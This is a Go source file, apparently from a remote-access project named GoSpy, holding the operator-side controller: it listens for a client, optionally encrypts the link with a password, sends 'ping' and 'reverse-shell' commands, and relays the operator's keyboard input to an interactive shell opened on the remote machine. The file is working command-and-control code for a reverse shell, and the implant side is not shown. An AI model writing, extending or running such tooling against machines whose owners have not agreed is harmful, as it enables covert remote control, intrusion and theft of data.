package client

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"net"
	"os"
	"strings"
)

// GoSpyClient represents a GoSpy client that is connected to this server.
type GoSpyClient struct {
	listener    net.Listener            // The server for listening to for connections from the client.
	cm          comms.ConnectionManager // The ConnectionManager for the main connection to the client.
	passwordStr string                  // The password for a secure connection.
}

// NewGoSpyClient creates instantiates a GoSpyClient.
// Binds the listener and waits for client connection before returning.
func NewGoSpyClient(bindAddress, password string) (client GoSpyClient, err error) {
	l, err := net.Listen("tcp", bindAddress)
	if err != nil {
		return GoSpyClient{}, err
	}
	c := GoSpyClient{listener: l, passwordStr: password}
	c.WaitForClient()
	return c, nil
}

// sendString sends a string to the client.
func (c GoSpyClient) sendString(message string) (err error) {
	return c.cm.SendBytes([]byte(message))
}

// recvString receives a string from the client.
func (c GoSpyClient) recvString() (message string, err error) {
	data, err := c.cm.RecvBytes()
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// WaitForClient calls WaitForConnection and then sets the returned ConnectionManager to the GoSpyClient's cm field.
func (c *GoSpyClient) WaitForClient() {
	c.cm = c.WaitForConnection()
}

// WaitForConnection waits for a successful connection to the listener and then sets up and returns a ConnectionManager.
func (c GoSpyClient) WaitForConnection() comms.ConnectionManager {
	for {
		conn, err := c.listener.Accept()
		if err != nil {
			continue
		}
		if c.passwordStr != "" {
			return comms.NewEncryptedConn(conn, c.passwordStr)
		} else {
			return comms.NewPlainConn(conn)
		}
	}
}

// Close closes the current connection manager.
func (c GoSpyClient) Close() (err error) {
	return c.cm.Close()
}

// CommandPing sends a "ping" to the client and waits for a "pong".
func (c GoSpyClient) CommandPing() (response string, err error) {
	err = c.sendString("ping")
	if err != nil {
		return "", err
	}
	return c.recvString()
}

// CommandReverseShell initiates a new connection with the client and uses it for a reverse shell.
func (c GoSpyClient) CommandReverseShell() (err error) {
	err = c.sendString("reverse-shell")
	if err != nil {
		return err
	}

	cm := c.WaitForConnection()

	fmt.Println("Type `exit` to leave the shell at any time")
	_ = comms.BridgeCMToWriter(cm, os.Stdout)

	for {
		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')

		textBytes := []byte(text)
		err = cm.SendBytes(textBytes)
		if err != nil {
			// Don't return the error because this is with the reverse shell connection, not with the original cm conn.
			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
			break
		}

		if strings.TrimSpace(text) == "exit" {
			break
		}
	}

	_ = cm.Close()
	return nil
}
